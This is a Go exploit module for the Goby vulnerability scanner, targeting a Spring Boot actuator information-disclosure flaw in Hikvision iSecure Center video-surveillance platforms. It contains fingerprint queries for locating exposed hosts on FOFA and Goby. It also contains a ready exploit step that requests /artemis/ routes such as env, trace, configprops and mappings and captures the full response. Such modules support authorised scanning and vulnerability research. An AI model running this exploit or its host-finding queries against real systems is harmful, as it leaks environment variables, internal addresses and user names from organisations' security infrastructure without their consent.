package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center springboot Information disclosure vulnerability",
    "Description": "<p>Hikvision iSecure Center is an integrated management platform that can centrally manage accessed video surveillance points to achieve unified deployment, unified configuration, unified management and unified scheduling.</p><p>The framework used by Hikvision iSecure Center has a Spring Boot information leakage vulnerability. An attacker can obtain information such as environment variables, intranet addresses, user names in configurations, etc. by accessing exposed routes.</p>",
    "Product": "HIKVISION-iSecure-Center",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2022-11-08",
    "Author": "sinkair",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "Level": "2",
    "Impact": "<p>The framework used by Hikvision iSecure Center has a Spring Boot information leakage vulnerability. An attacker can obtain information such as environment variables, intranet addresses, user names in configurations, etc. by accessing exposed routes.</p>",
    "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.hikvision.com/cn\">https://www.hikvision.com/</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "route",
            "type": "select",
            "value": "env,trace,beans,info,mappings,metrics,configprops",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/artemis/env",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "******",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "hikvision",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/artemis/{{{route}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iSecure Center SpringBoot 信息泄露漏洞",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>Hikvision iSecure Center 是一款集成管理平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统一管理和统一调度。</p><p>Hikvision iSecure Center 使用的框架存在 Spring Boot 信息泄露漏洞，攻击者可以通过访问暴露的路由获取环境变量、内网地址、配置中的用户名等信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.hikvision.com/cn\">https://www.hikvision.com/cn</a><br></p><p>2、如非必要，禁止公网访问该系统<br></p>",
            "Impact": "<p>Hikvision iSecure Center 使用的框架存在 Spring Boot 信息泄露漏洞，攻击者可以通过访问暴露的路由获取环境变量、内网地址、配置中的用户名等信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center springboot Information disclosure vulnerability",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>Hikvision iSecure Center is an integrated management platform that can centrally manage accessed video surveillance points to achieve unified deployment, unified configuration, unified management and unified scheduling.</p><p>The framework used by Hikvision iSecure Center has a Spring Boot information leakage vulnerability. An attacker can obtain information such as environment variables, intranet addresses, user names in configurations, etc. by accessing exposed routes.</p>",
            "Recommendation": "<p>1.There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://www.hikvision.com/cn\" target=\"_blank\">https://www.hikvision.com/</a></p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The framework used by Hikvision iSecure Center has a Spring Boot information leakage vulnerability. An attacker can obtain information such as environment variables, intranet addresses, user names in configurations, etc. by accessing exposed routes.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10769"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}